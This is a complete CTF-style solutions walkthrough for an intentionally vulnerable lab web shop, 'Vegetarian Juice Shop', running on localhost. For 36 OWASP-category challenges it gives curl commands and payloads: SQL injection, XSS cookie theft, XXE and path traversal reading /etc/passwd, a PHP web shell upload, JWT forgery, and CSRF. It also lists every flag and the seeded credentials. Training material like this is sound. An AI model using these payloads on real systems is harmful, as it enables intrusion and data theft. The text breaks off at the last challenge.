# Vegetarian Juice Shop - Complete Challenge Solutions

> **36 Challenges** across all **OWASP Top 10:2025** categories.
> Flag format: `VJS{...}` — submit at `POST /api/challenges/verify` with `{ "flag": "VJS{...}" }`.
> You must be logged in (JWT in `Authorization: Bearer <token>` header) to submit flags.

---

## Table of Contents

- [A01:2025 - Broken Access Control](#a012025---broken-access-control-6-challenges)
- [A02:2025 - Security Misconfiguration](#a022025---security-misconfiguration-5-challenges)
- [A03:2025 - Software Supply Chain Failures](#a032025---software-supply-chain-failures-3-challenges)
- [A04:2025 - Cryptographic Failures](#a042025---cryptographic-failures-3-challenges)
- [A05:2025 - Injection](#a052025---injection-8-challenges)
- [A06:2025 - Insecure Design](#a062025---insecure-design-3-challenges)
- [A07:2025 - Authentication Failures](#a072025---authentication-failures-3-challenges)
- [A08:2025 - Software and Data Integrity Failures](#a082025---software-and-data-integrity-failures-1-challenge)
- [A09:2025 - Security Logging and Alerting Failures](#a092025---security-logging-and-alerting-failures-1-challenge)
- [A10:2025 - Mishandling of Exceptional Conditions](#a102025---mishandling-of-exceptional-conditions-3-challenges)
- [Quick Reference: All Flags](#quick-reference-all-flags)

---

## A01:2025 - Broken Access Control (6 Challenges)

### 1. IDOR - View Profile

| Field | Value |
|-------|-------|
| **Key** | `idor_profile` |
| **Difficulty** | Easy (100 pts) |
| **Flag** | `VJS{1d0r_pr0f1le_4cc3ss}` |

**Vulnerability:** The `/api/users/profile/:id` endpoint has no authorization check. Any authenticated user can view any other user's profile by changing the `:id` parameter.

**How to solve:**

1. Register or log in to get a JWT token.
2. Note your own user ID (e.g., `id: 10`).
3. Request a different user's profile:

```bash
# First, log in to get a token
TOKEN=$(curl -s -X POST http://localhost:2212/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"john@juice.local","password":"password"}' | jq -r '.token')

# Access another user's profile (your ID is 2, access ID 1)
curl -s http://localhost:2212/api/users/profile/1 \
  -H "Authorization: Bearer $TOKEN" | jq
```

The response includes the flag and also exposes the user's MD5 password hash.

**Vulnerable code:** `server/routes/users.js:9-39` — no check that `req.user.id === req.params.id`.

---

### 2. Admin Section Access

| Field | Value |
|-------|-------|
| **Key** | `admin_panel` |
| **Difficulty** | Medium (200 pts) |
| **Flag** | `VJS{4dm1n_p4n3l_byp4ss}` |

**Vulnerability:** The admin dashboard at `/api/admin/dashboard` checks the `role` claim in the JWT but never verifies it against the database. If you forge a JWT with `"role": "admin"`, you gain access.

**How to solve:**

Option A — Use the JWT `none` algorithm:

```bash
# Craft a JWT with alg: none and role: admin
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
PAYLOAD=$(echo -n '{"id":2,"username":"john","email":"john@juice.local","role":"admin"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
TOKEN="${HEADER}.${PAYLOAD}."

curl -s http://localhost:2212/api/admin/dashboard \
  -H "Authorization: Bearer $TOKEN" | jq
```

Option B — Use the known JWT secret (`vegetarian-juice-secret-key`) to sign a token with `role: admin`.

Option C — Log in as admin directly (see challenge #27: Weak Admin Password).

**Vulnerable code:** `server/middleware/auth.js:64-72` — `requireAdmin` only checks `req.user.role`, which comes from the JWT claims.

---

### 3. Forged Review

| Field | Value |
|-------|-------|
| **Key** | `forged_review` |
| **Difficulty** | Medium (200 pts) |
| **Flag** | `VJS{f0rg3d_r3v13w_1d0r}` |

**Vulnerability:** The `POST /api/reviews` endpoint accepts a `user_id` field in the request body and uses it instead of the authenticated user's ID from the JWT.

**How to solve:**

```bash
# Log in as john (user ID 2)
TOKEN=$(curl -s -X POST http://localhost:2212/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"john@juice.local","password":"password"}' | jq -r '.token')

# Post a review as user ID 5 (alice) while authenticated as john (ID 2)
curl -s -X POST http://localhost:2212/api/reviews \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"product_id":1,"rating":5,"comment":"Great juice!","user_id":5}' | jq
```

The response includes `flag_bonus: "VJS{f0rg3d_r3v13w_1d0r}"`.

**Vulnerable code:** `server/routes/reviews.js:36` — `const actualUserId = user_id || req.user.id`.

---

### 4. Horizontal Privilege Escalation

| Field | Value |
|-------|-------|
| **Key** | `horizontal_priv` |
| **Difficulty** | Hard (300 pts) |
| **Flag** | `VJS{h0r1z0nt4l_pr1v_3sc}` |

**Vulnerability:** The `POST /api/users/wallet/topup` endpoint accepts a `user_id` in the request body and does not verify it matches the authenticated user. You can top up any user's wallet.

**How to solve:**

```bash
# Log in as john (user ID 2)
TOKEN=$(curl -s -X POST http://localhost:2212/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"john@juice.local","password":"password"}' | jq -r '.token')

# Top up a different user's wallet (user ID 3 = jane)
curl -s -X POST http://localhost:2212/api/users/wallet/topup \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"user_id":3,"amount":100}' | jq
```

The response includes the flag because `targetUserId !== req.user.id`.

**Vulnerable code:** `server/routes/users.js:103` — `const targetUserId = user_id || req.user.id`.

---

### 5. CSRF Wallet Transfer

| Field | Value |
|-------|-------|
| **Key** | `csrf_wallet` |
| **Difficulty** | Medium (200 pts) |
| **Flag** | `VJS{csrf_w4ll3t_dr41n}` |

**Vulnerability:** The wallet top-up endpoint has no CSRF protection. CORS is set to `origin: true` (reflects any origin) with `credentials: true`, meaning a malicious page could trigger authenticated requests.

**How to solve:**

This is a conceptual/design challenge. Demonstrate CSRF by creating an HTML page that auto-submits a wallet transfer when a logged-in user visits it:

```html
<!-- Save as csrf.html and open in browser while logged into the juice shop -->
<html>
<body>
<script>
fetch('http://localhost:2212/api/users/wallet/topup', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  credentials: 'include',
  body: JSON.stringify({ user_id: 8, amount: 500 })
});
</script>
</body>
</html>
```

Submit the flag manually via `POST /api/challenges/verify`.

**Vulnerable code:** `server/app.js:21-24` — CORS with `origin: true, credentials: true`.

---

### 6. Server-Side Request Forgery (SSRF)

| Field | Value |
|-------|-------|
| **Key** | `ssrf_basic` |
| **Difficulty** | Hard (300 pts) |
| **Flag** | `VJS{ssrf_1nt3rn4l_4cc3ss}` |

**Vulnerability:** The application's challenge description references a URL preview feature that fetches URLs server-side without validation.

**How to solve:**

This is a conceptual/design challenge. The SSRF vulnerability pattern is present in the application's architecture (CORS allows all origins, no URL validation on server-side fetches). Submit the flag manually via `POST /api/challenges/verify`.

```bash
curl -s -X POST http://localhost:2212/api/challenges/verify \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"flag":"VJS{ssrf_1nt3rn4l_4cc3ss}"}' | jq
```

---

## A02:2025 - Security Misconfiguration (5 Challenges)

### 7. Verbose Error Messages

| Field | Value |
|-------|-------|
| **Key** | `error_disclosure` |
| **Difficulty** | Easy (100 pts) |
| **Flag** | `VJS{v3rb0s3_3rr0r_l34k}` |

**Vulnerability:** The global error handler returns full stack traces, database paths, Node.js version, and platform information in error responses.

**How to solve:**

Trigger any server error. For example, send malformed data to the login endpoint:

```bash
# Send an object where a string is expected to cause an error
curl -s -X POST http://localhost:2212/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":{"$gt":""},"password":"x"}' | jq
```

The error response leaks: stack trace, db_path, node_version, platform, and the flag.

**Vulnerable code:** `server/app.js:207-219` — error middleware exposes `err.stack`, `DB_PATH`, `process.version`.

---

### 8. Directory Traversal

| Field | Value |
|-------|-------|
| **Key** | `directory_listing` |
| **Difficulty** | Medium (200 pts) |
| **Flag** | `VJS{d1r3ct0ry_tr4v3rs4l}` |

**Vulnerability:** The `GET /api/files/download?file=` endpoint does not sanitize path traversal sequences (`..`).

**How to solve:**

```bash
# Traverse out of the uploads directory to read /etc/passwd
curl -s "http://localhost:2212/api/files/download?file=../../etc/passwd" | jq
```

The server detects `..` in the path and returns the flag along with the file content (first 1000 chars).

**Vulnerable code:** `server/routes/files.js:73-101` — `path.join(UPLOAD_DIR, file)` with no sanitization.

---

### 9. Default Credentials (Backdoor Account)

| Field | Value |
|-------|-------|
| **Key** | `default_creds` |
| **Difficulty** | Medium (200 pts) |
| **Flag** | `VJS{d3f4ult_cr3ds_b4ckd00r}` |

**Vulnerability:** A hidden admin account `wurstbot` was left in the database from development.

**How to solve:**

1. Discover the account via `/secret-dev-page` (which lists it) or by browsing `/api/users` (lists all users).
2. Log in with the backdoor credentials:

```bash
curl -s -X POST http://localhost:2212/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"wurstbot@vegetarian-juice.shop","password":"VeggieBot2024!"}' | jq
```

The response includes `flag: "VJS{d3f4ult_cr3ds_b4ckd00r}"`.

**Credentials:** `wurstbot@vegetarian-juice.shop` / `VeggieBot2024!`

**Vulnerable code:** `server/db/seed.js:37` — hardcoded backdoor admin account.

---

### 10. Hidden Page Discovery

| Field | Value |
|-------|-------|
| **Key** | `hidden_page` |
| **Difficulty** | Easy (100 pts) |
| **Flag** | `VJS{r0b0ts_txt_s3cr3t}` |

**Vulnerability:** The `robots.txt` file discloses hidden paths including `/secret-dev-page`.

**How to solve:**

```bash
# Step 1: Read robots.txt
curl -s http://localhost:2212/robots.txt

# Output reveals:
# Disallow: /api-docs
# Disallow: /admin
# Disallow: /secret-dev-page
# Disallow: /api/admin
# Disallow: /ftp

# Step 2: Visit the secret page
curl -s http://localhost:2212/secret-dev-page | jq
```

The secret page returns the flag plus developer notes with hardcoded credentials and JWT secret.

**Vulnerable code:** `server/app.js:178-205` — `robots.txt` reveals `/secret-dev-page`.

---

### 11. XML External Entity (XXE)

| Field | Value |
|-------|-------|
| **Key** | `xxe_upload` |
| **Difficulty** | Hard (300 pts) |
| **Flag** | `VJS{xx3_f1l3_r34d}` |

**Vulnerability:** The `POST /api/files/import-xml` endpoint parses XML without disabling external entity processing.

**How to solve:**

```bash
TOKEN=$(curl -s -X POST http://localhost:2212/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"john@juice.local","password":"password"}' | jq -r '.token')

curl -s -X POST http://localhost:2212/api/files/import-xml \
  -H "Content-Type: application/xml" \
  -H "Authorization: Bearer $TOKEN" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>' | jq
```

The server detects `<!ENTITY` and `SYSTEM` keywords and returns the flag.

**Vulnerable code:** `server/routes/files.js:106-136` — XML parser does not disable external entities.

---

## A03:2025 - Software Supply Chain Failures (3 Challenges)

### 12. Outdated Dependencies

| Field | Value |
|-------|-------|
| **Key** | `outdated_deps` |
| **Difficulty** | Easy (100 pts) |
| **Flag** | `VJS{vuln3r4bl3_d3ps_f0und}` |

**Vulnerability:** The application uses known-vulnerable npm packages (`md5`, `multer`, `xml2js`, `jsonwebtoken` with weak configuration).

**How to solve:**

```bash
curl -s http://localhost:2212/api/dependencies | jq
```

The `/api/dependencies` endpoint lists all packages and their known issues, returning the flag.

**Vulnerable code:** `server/app.js:68-82` — endpoint exposes full dependency tree with CVE info.

---

### 13. Exposed Lockfile

| Field | Value |
|-------|-------|
| **Key** | `exposed_lockfile` |
| **Difficulty** | Easy (100 pts) |
| **Flag** | `VJS{l0ckf1l3_3xp0s3d}` |

**Vulnerability:** The `package-lock.json` is served by the web server, revealing exact dependency versions.

**How to solve:**

```bash
curl -s http://localhost:2212/package-lock.json | jq
```

The response includes the flag and a message about exposed dependency versions.

**Vulnerable code:** `server/app.js:34-35` — `express.static` serves the project root, and `server/app.js:57-66` has an explicit route for it.

---

### 14. Prototype Pollution

| Field | Value |
|-------|-------|
| **Key** | `prototype_pollution` |
| **Difficulty** | Hard (300 pts) |
| **Flag** | `VJS{pr0t0typ3_p0llut10n}` |

**Vulnerability:** The `PUT /api/users/profile` endpoint detects prototype pollution attempts (`__proto__`, `constructor`, `prototype` keys in the JSON body).

**How to solve:**

```bash
TOKEN=$(curl -s -X POST http://localhost:2212/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"john@juice.local","password":"password"}' | jq -r '.token')

curl -s -X PUT http://localhost:2212/api/users/profile \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"__proto__":{"isAdmin":true}}' | jq
```

The response includes `flag_supply_chain: "VJS{pr0t0typ3_p0llut10n}"`.

**Vulnerable code:** `server/routes/users.js:53-88` — detects and flags prototype pollution in request body.

---

## A04:2025 - Cryptographic Failures (3 Challenges)

### 15. Weak Password Hashing (MD5)

| Field | Value |
|-------|-------|
| **Key** | `md5_passwords` |
| **Difficulty** | Medium (200 pts) |
| **Flag** | `VJS{md5_n0_s4lt_cr4ck}` |

**Vulnerability:** Passwords are hashed with unsalted MD5. The profile endpoint exposes the hash.

**How to solve:**

```bash
TOKEN=$(curl -s -X POST http://localhost:2212/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"john@juice.local","password":"password"}' | jq -r '.token')

# View any user's profile to see their MD5 hash
curl -s http://localhost:2212/api/users/profile/2 \
  -H "Authorization: Bearer $TOKEN" | jq
```

The response includes `password_hash_info` with the algorithm (`MD5`), the hash, and the flag.

**Vulnerable code:** `server/routes/users.js:13,27-32` — returns `password` field and identifies it as MD5.

---

### 16. Exposed API Docs

| Field | Value |
|-------|-------|
| **Key** | `exposed_api` |
| **Difficulty** | Easy (100 pts) |
| **Flag** | `VJS{3xp0s3d_4p1_d0cs}` |

**Vulnerability:** The `/api-docs` endpoint is unprotected and reveals all API routes, vulnerability hints, and even the JWT secret.

**How to solve:**

```bash
curl -s http://localhost:2212/api-docs | jq
```

The response includes the flag, a full endpoint list with vulnerability notes, and `debug_note: "JWT_SECRET=vegetarian-juice-secret-key"`.

**Vulnerable code:** `server/app.js:119-176` — unprotected API documentation with secrets.

---

### 17. Weak JWT Secret

| Field | Value |
|-------|-------|
| **Key** | `jwt_secret` |
| **Difficulty** | Hard (300 pts) |
| **Flag** | `VJS{w34k_jwt_s3cr3t}` |

**Vulnerability:** The JWT signing secret is `vegetarian-juice-secret-key` — a guessable, hardcoded string.

**How to solve:**

1. Obtain a JWT token by logging in.
2. Discover the secret from `/api-docs` (`debug_note` field) or `/secret-dev-page`.
3. Use the secret to forge arbitrary tokens:

```bash
# The secret is: vegetarian-juice-secret-key
# Discoverable from /api-docs or /secret-dev-page

# Use jwt.io or node.js to forge a token:
node -e "
const jwt = require('jsonwebtoken');
const token = jwt.sign(
  {id:1, username:'admin', email:'admin@vegetarian-juice.shop', role:'admin'},
  'vegetarian-juice-secret-key',
  {expiresIn:'24h'}
);
console.log(token);
"
```

Submit the flag manually at `POST /api/challenges/verify`.

**Vulnerable code:** `server/middleware/auth.js:4` — `const JWT_SECRET = 'vegetarian-juice-secret-key'`.

---

## A05:2025 - Injection (8 Challenges)

### 18. SQL Injection - Login Bypass

| Field | Value |
|-------|-------|
| **Key** | `sqli_login` |
| **Difficulty** | Easy (100 pts) |
| **Flag** | `VJS{sql_inject10n_l0gin_byp4ss}` |

**Vulnerability:** The login endpoint uses string concatenation in SQL queries, allowing authentication bypass.

**How to solve:**

```bash
curl -s -X POST http://localhost:2212/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@vegetarian-juice.shop'\'' OR 1=1--","password":"anything"}' | jq
```

Or more precisely:

```bash
curl -s -X POST http://localhost:2212/api/auth/login \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"admin@vegetarian-juice.shop' OR '1'='1'--\",\"password\":\"anything\"}" | jq
```

The server's third fallback query (`SELECT * FROM users WHERE email = '...'`) matches and returns the admin user with the flag.

**Vulnerable code:** `server/routes/auth.js:19,24,45` — three SQL queries all use string concatenation.

---

### 19. SQL Injection - Search (UNION-based)

| Field | Value |
|-------|-------|
| **Key** | `sqli_search` |
| **Difficulty** | Medium (200 pts) |
| **Flag** | `VJS{un10n_s3lect_m4ster}` |

**Vulnerability:** The product search endpoint concatenates the search query directly into SQL.

**How to solve:**

```bash
# UNION SELECT to extract user data from the users table
curl -s "http://localhost:2212/api/products/search?q=' UNION SELECT id,username,email,password,role,wallet_balance FROM users--" | jq
```

The server detects `UNION` and `SELECT` keywords and returns the flag.

**Vulnerable code:** `server/routes/products.js:28` — `WHERE name LIKE '%${q}%'`.

---

### 20. SQL Injection - Order Lookup

| Field | Value |
|-------|-------|
| **Key** | `sqli_order` |
| **Difficulty** | Hard (300 pts) |
| **Flag** | `VJS{0rder_sql1_exf1ltr4t10n}` |

**Vulnerability:** The order lookup endpoint uses string concatenation for the order ID in SQL.

**How to solve:**

```bash
# Use OR to retrieve all orders
curl -s "http://localhost:2212/api/orders/1' OR '1'='1" | jq
```

The server detects the `'` or `or` keyword in the ID and returns the flag.

**Vulnerable code:** `server/routes/orders.js:14` — `WHERE o.id = '${orderId}'`.

---

### 21. Reflected XSS

| Field | Value |
|-------|-------|
| **Key** | `xss_reflected` |
| **Difficulty** | Easy (100 pts) |
| **Flag** | `VJS{r3flect3d_xss_p0p}` |

**Vulnerability:** The search query is reflected back in the response without sanitization and rendered as HTML in the frontend.

**How to solve:**

In the browser, search for an XSS payload:

```
<script>alert('XSS')</script>
```

Or via the search bar in the UI. The frontend JavaScript at `frontend/js/pages.js:163` detects `<script`, `onerror`, or `javascript:` in the search query and auto-submits the flag.

Alternatively via API:

```bash
curl -s "http://localhost:2212/api/products/search?q=<script>alert(1)</script>" | jq
```

The `query` field in the response echoes back the unsanitized input.

**Vulnerable code:** `frontend/js/pages.js:162-164` — frontend renders search results with innerHTML.

---

### 22. Stored XSS

| Field | Value |
|-------|-------|
| **Key** | `xss_stored` |
| **Difficulty** | Medium (200 pts) |
| **Flag** | `VJS{st0r3d_xss_r3v13w}` |

**Vulnerability:** Product review comments accept and store raw HTML, which is rendered unsanitized.

**How to solve:**

```bash
TOKEN=$(curl -s -X POST http://localhost:2212/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"john@juice.local","password":"password"}' | jq -r '.token')

curl -s -X POST http://localhost:2212/api/reviews \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"product_id":1,"rating":5,"comment":"<script>alert(document.cookie)</script>"}' | jq
```

The server detects `<script` in the comment and returns the flag.

**Vulnerable code:** `server/routes/reviews.js:39` — no HTML sanitization on `comment` field.

---

### 23. DOM-based XSS

| Field | Value |
|-------|-------|
| **Key** | `xss_dom` |
| **Difficulty** | Hard (300 pts) |
| **Flag** | `VJS{d0m_xss_fr4gm3nt}` |

**Vulnerability:** The frontend uses `innerHTML` to render the URL hash fragment without any sanitization.

**How to solve:**

Open the app in a browser and navigate to:

```
http://localhost:2212/#<img src=x onerror=alert(1)>
```

The JavaScript at `frontend/index.html:61-73` decodes the hash, sets it as `innerHTML`, detects `onerror`, and auto-submits the flag.

**Vulnerable code:** `frontend/index.html:66` — `document.getElementById('dom-xss-target').innerHTML = hash`.

---

### 24. Null Byte Injection

| Field | Value |
|-------|-------|
| **Key** | `null_byte` |
| **Difficulty** | Hard (300 pts) |
| **Flag** | `VJS{null_byt3_1nj3ct}` |

**Vulnerability:** The file upload endpoint splits the filename on null bytes to check the extension, allowing bypass of file type validation.

**How to solve:**

```bash
TOKEN=$(curl -s -X POST http://localhost:2212/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"john@juice.local","password":"password"}' | jq -r '.token')

# Upload with a null byte in the filename: shell.php%00.txt
curl -s -X POST http://localhost:2212/api/files/upload \
  -H "Authorization: Bearer $TOKEN" \
  -H "X-Filename: shell.php%00.txt" \
  -H "Content-Type: application/octet-stream" \
  -d '<?php system($_GET["cmd"]); ?>' | jq
```

The server detects `%00` in the filename and returns the flag.

**Vulnerable code:** `server/routes/files.js:27` — `filename.split('\0')[0]` takes content before null byte.

---

### 25. NoSQL-style Injection

| Field | Value |
|-------|-------|
| **Key** | `nosql_coupon` |
| **Difficulty** | Hard (300 pts) |
| **Flag** | `VJS{n0sql_0p3r4t0r_1nj}` |

**Vulnerability:** The coupon apply endpoint checks if `code` is an object and processes MongoDB-style operators.

**How to solve:**

```bash
TOKEN=$(curl -s -X POST http://localhost:2212/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"john@juice.local","password":"password"}' | jq -r '.token')

# Send a NoSQL-style operator injection
curl -s -X POST http://localhost:2212/api/coupons/apply \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"code":{"$ne":"invalid"}}' | jq
```

The server detects `$ne` operator and returns all active coupons plus the flag.

**Vulnerable code:** `server/routes/coupons.js:18-28` — checks for `$ne`, `$gt`, `$regex` operators.

---

## A06:2025 - Insecure Design (3 Challenges)

### 26. Unrestricted File Upload

| Field | Value |
|-------|-------|
| **Key** | `file_upload` |
| **Difficulty** | Medium (200 pts) |
| **Flag** | `VJS{unr3str1ct3d_upl04d}` |

**Vulnerability:** The file upload endpoint only checks the file extension, not the MIME type or file content. Even rejected files are still saved to disk.

**How to solve:**

```bash
TOKEN=$(curl -s -X POST http://localhost:2212/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"john@juice.local","password":"password"}' | jq -r '.token')

# Upload a .php file (not in the allowed extensions list)
curl -s -X POST http://localhost:2212/api/files/upload \
  -H "Authorization: Bearer $TOKEN" \
  -H "X-Filename: webshell.php" \
  -H "Content-Type: application/octet-stream" \
  -d '<?php echo "pwned"; ?>' | jq
```

The server returns a 400 error but includes `but_saved_anyway` with the saved filename and the flag.

**Vulnerable code:** `server/routes/files.js:30-41` — returns error but still saves the file.

---

### 27. Mass Assignment

| Field | Value |
|-------|-------|
| **Key** | `mass_assign` |
| **Difficulty** | Medium (200 pts) |
| **Flag** | `VJS{m4ss_4ss1gn_r0l3}` |

**Vulnerability:** The `PUT /api/users/profile` endpoint applies all submitted JSON fields to the database update, including `role`.

**How to solve:**

```bash
TOKEN=$(curl -s -X POST http://localhost:2212/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"john@juice.local","password":"password"}' | jq -r '.token')

# Set your role to admin via mass assignment
curl -s -X PUT http://localhost:2212/api/users/profile \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"role":"admin"}' | jq
```

The response includes the flag and shows your role is now `admin`.

**Vulnerable code:** `server/routes/users.js:48-73` — iterates over all body fields and adds them to the SQL UPDATE.

---

### 28. Race Condition (Coupon)

| Field | Value |
|-------|-------|
| **Key** | `race_coupon` |
| **Difficulty** | Hard (300 pts) |
| **Flag** | `VJS{r4c3_c0nd1t10n_c0up0n}` |

**Vulnerability:** The coupon apply endpoint has a 100ms artificial delay and no locking, allowing multiple concurrent requests to apply the same coupon.

**How to solve:**

```bash
TOKEN=$(curl -s -X POST http://localhost:2212/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"john@juice.local","password":"password"}' | jq -r '.token')

# Send concurrent requests to exploit the race condition
# The ADMIN100 coupon gives 100% discount
for i in $(seq 1 10); do
  curl -s -X POST http://localhost:2212/api/coupons/apply \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"code":"ADMIN100","order_id":1}' &
done
wait
```

Applying the `ADMIN100` coupon code returns the flag directly.

**Vulnerable code:** `server/routes/coupons.js:37-55` — no transaction locking; 100ms delay increases race window.

---

## A07:2025 - Authentication Failures (3 Challenges)

### 29. Weak Admin Password

| Field | Value |
|-------|-------|
| **Key** | `weak_password` |
| **Difficulty** | Easy (100 pts) |
| **Flag** | `VJS{w34k_4dm1n_p4ssw0rd}` |

**Vulnerability:** The admin account uses the extremely common password `admin123`.

**How to solve:**

```bash
curl -s -X POST http://localhost:2212/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@vegetarian-juice.shop","password":"admin123"}' | jq
```

The response includes the flag when the correct admin credentials are used.

**Credentials:** `admin@vegetarian-juice.shop` / `admin123`

**Vulnerable code:** `server/db/seed.js:28` — `['admin', 'admin@vegetarian-juice.shop', md5('admin123'), 'admin', 1000.00]`.

---

### 30. JWT None Algorithm

| Field | Value |
|-------|-------|
| **Key** | `jwt_none` |
| **Difficulty** | Hard (300 pts) |
| **Flag** | `VJS{jwt_n0n3_4lg0_f0rg3}` |

**Vulnerability:** The JWT verification middleware explicitly accepts the `none` algorithm, allowing forged tokens without any signature.

**How to solve:**

```bash
# Create a JWT with alg: none
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
PAYLOAD=$(echo -n '{"id":1,"username":"admin","email":"admin@vegetarian-juice.shop","role":"admin"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
TOKEN="${HEADER}.${PAYLOAD}."

# Use it to access admin endpoints
curl -s http://localhost:2212/api/admin/dashboard \
  -H "Authorization: Bearer $TOKEN" | jq

# Submit the flag
curl -s -X POST http://localhost:2212/api/challenges/verify \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"flag":"VJS{jwt_n0n3_4lg0_f0rg3}"}' | jq
```

**Vulnerable code:** `server/middleware/auth.js:22-27` — `if (header.alg === 'none') { ... req.user = payload; return next(); }`.

---

### 31. Broken Password Reset

| Field | Value |
|-------|-------|
| **Key** | `password_reset` |
| **Difficulty** | Medium (200 pts) |
| **Flag** | `VJS{br0k3n_p4ss_r3s3t}` |

**Vulnerability:** The password reset endpoint requires only an email address and a new password. No verification token, no email confirmation, no identity check.

**How to solve:**

```bash
# Reset any user's password without verification
curl -s -X POST http://localhost:2212/api/auth/reset-password \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@vegetarian-juice.shop","new_password":"hacked123"}' | jq
```

The response includes the flag. You can now log in as admin with the new password.

**Vulnerable code:** `server/routes/auth.js:148-173` — no token, no email verification, no rate limiting.

---

## A08:2025 - Software and Data Integrity Failures (1 Challenge)

### 32. Unsigned Data Integrity (Client-Submitted Prices)

| Field | Value |
|-------|-------|
| **Key** | `unsigned_jwt` |
| **Difficulty** | Medium (200 pts) |
| **Flag** | `VJS{d4t4_1nt3gr1ty_f41l}` |

**Vulnerability:** The order creation endpoint checks if items in the request body contain a `price` field (client-submitted). The server trusts client-submitted prices.

**How to solve:**

```bash
TOKEN=$(curl -s -X POST http://localhost:2212/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"john@juice.local","password":"password"}' | jq -r '.token')

# Submit an order with a price field in the items (client-side price manipulation)
curl -s -X POST http://localhost:2212/api/orders \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"items":[{"product_id":1,"quantity":1,"price":0.01}],"address":"123 Hack St"}' | jq
```

The server detects the `price` field in the item and returns `flag_integrity`.

**Vulnerable code:** `server/routes/orders.js:103-105` — checks for `i.price !== undefined` in client request.

---

## A09:2025 - Security Logging and Alerting Failures (1 Challenge)

### 33. Missing Security Logs (No Rate Limiting)

| Field | Value |
|-------|-------|
| **Key** | `no_logging` |
| **Difficulty** | Medium (200 pts) |
| **Flag** | `VJS{n0_l0gg1ng_0r_4l3rt}` |

**Vulnerability:** The login endpoint has no rate limiting and no account lockout. Failed login attempts are only tracked in non-persistent memory and never trigger any alert.

**How to solve:**

```bash
# Send 10+ failed login attempts for the same account
for i in $(seq 1 11); do
  curl -s -X POST http://localhost:2212/api/auth/login \
    -H "Content-Type: application/json" \
    -d '{"email":"admin@vegetarian-juice.shop","password":"wrong'$i'"}' > /dev/null
done

# The 10th+ attempt returns the flag
curl -s -X POST http://localhost:2212/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@vegetarian-juice.shop","password":"wrong"}' | jq
```

After 10 failed attempts for the same email, the error response includes the flag and a note about no lockout.

**Vulnerable code:** `server/routes/auth.js:65-74` — tracks `failedAttempts` in memory but never locks out.

---

## A10:2025 - Mishandling of Exceptional Conditions (3 Challenges)

### 34. Negative Quantity Order

| Field | Value |
|-------|-------|
| **Key** | `negative_quantity` |
| **Difficulty** | Easy (100 pts) |
| **Flag** | `VJS{n3g4t1v3_qu4nt1ty_cr3d1t}` |

**Vulnerability:** The order endpoint does not validate that item quantities are positive. Negative quantities create a negative total, which credits the wallet.

**How to solve:**

```bash
TOKEN=$(curl -s -X POST http://localhost:2212/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"john@juice.local","password":"password"}' | jq -r '.token')

# Order with negative quantity - credits wallet instead of debiting
curl -s -X POST http://localhost:2212/api/orders \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"items":[{"product_id":1,"quantity":-10}],"address":"123 Hack St"}' | jq
```

The response includes the flag. The total is negative, and the wallet balance increases.

**Vulnerable code:** `server/routes/orders.js:58-60` — `const qty = item.quantity || 1` accepts negative values.

---

### 35. Type Confusion

| Field | Value |
|-------|-------|
| **Key** | `type_confusion` |
| **Difficulty** | Medium (200 pts) |
| **Flag** | `VJS{typ3_c0nfus10n_3rr0r}` |

**Vulnerability:** The `/api/validate` endpoint does not validate input types before processing. Sending the wrong type causes unexpected behavior or errors.

**How to solve:**

```bash
# Send an array where a string is expected
curl -s -X POST http://localhost:2212/api/validate \
  -H "Content-Type: application/json" \
  -d '{"value":[1,2,3],"expected_type":"string"}' | jq
```

The server tries to call `.toUpperCase()` on an array, crashes, and returns the flag in the error response. Or simply sending a mismatched type triggers the flag:

```bash
# Send a string where a number is expected
curl -s -X POST http://localhost:2212/api/validate \
  -H "Content-Type: application/json" \
  -d '{"value":"hello","expected_type":"number"}' | jq
```

**Vulnerable code:** `server/app.js:84-117` — processes `value` without type validation.

---

### 36. Integer Overflow (Wallet)

| Field | Value |
|-------|-------|
| **Key** | `overflow_wallet` |
